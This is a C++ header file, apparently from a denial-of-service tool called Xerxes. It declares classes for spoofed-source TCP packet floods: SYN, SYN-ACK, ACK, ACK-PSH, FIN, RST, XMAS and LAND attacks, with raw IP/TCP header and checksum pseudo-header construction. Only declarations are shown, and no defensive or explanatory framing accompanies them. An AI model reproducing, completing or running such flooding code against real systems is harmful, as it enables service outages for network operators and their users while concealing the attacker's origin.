#ifndef XERXES_SPOOFED_TCP_FLOOD_H
#define XERXES_SPOOFED_TCP_FLOOD_H

#include "base_spoofed_flood.hpp"

#define __FAVOR_BSD
#include <netinet/ip.h>
#include <netinet/tcp.h>

class spoofed_tcp_flood : public base_spoofed_flood {

public:
  spoofed_tcp_flood();
  ~spoofed_tcp_flood() = default;

protected:
  char *gen_hdr(sockaddr_in *dst, int len) override;
  virtual void init_hdr(tcphdr *tcp, iphdr *ip);
  virtual void finalize_hdr(tcphdr *tcp, iphdr *ip);

  struct pshdr {
    u_int32_t saddr = 0;
    u_int32_t daddr = 0;
    u_int8_t zero = 0;
    u_int8_t proto = IPPROTO_TCP;
    u_int16_t len = 0;
    tcphdr tcp;
  };
};

class syn_flood : public spoofed_tcp_flood {

public:
  syn_flood();
  ~syn_flood() = default;
};

class syn_ack_flood : public spoofed_tcp_flood {

public:
  syn_ack_flood();
  ~syn_ack_flood() = default;

protected:
  void finalize_hdr(tcphdr *tcp, iphdr *ip) override;
};

class ack_flood : public spoofed_tcp_flood {

public:
  ack_flood();
  ~ack_flood() = default;

protected:
  void finalize_hdr(tcphdr *tcp, iphdr *ip) override;
};

class ack_psh_flood : public spoofed_tcp_flood {

public:
  ack_psh_flood();
  ~ack_psh_flood() = default;

protected:
  void finalize_hdr(tcphdr *tcp, iphdr *ip) override;
};

class fin_flood : public spoofed_tcp_flood {

public:
  fin_flood();
  ~fin_flood() = default;

protected:
  void finalize_hdr(tcphdr *tcp, iphdr *ip) override;
};

class rst_flood : public spoofed_tcp_flood {

public:
  rst_flood();
  ~rst_flood() = default;

protected:
  void finalize_hdr(tcphdr *tcp, iphdr *ip) override;
};

class xmas_flood : public spoofed_tcp_flood {

public:
  xmas_flood();
  ~xmas_flood() = default;

protected:
  void finalize_hdr(tcphdr *tcp, iphdr *ip) override;
};

class land : public spoofed_tcp_flood {

public:
  land();
  ~land() = default;

protected:
  void finalize_hdr(tcphdr *tcp, iphdr *ip) override;
};

#endif // XERXES_SPOOFED_TCP_FLOOD_H
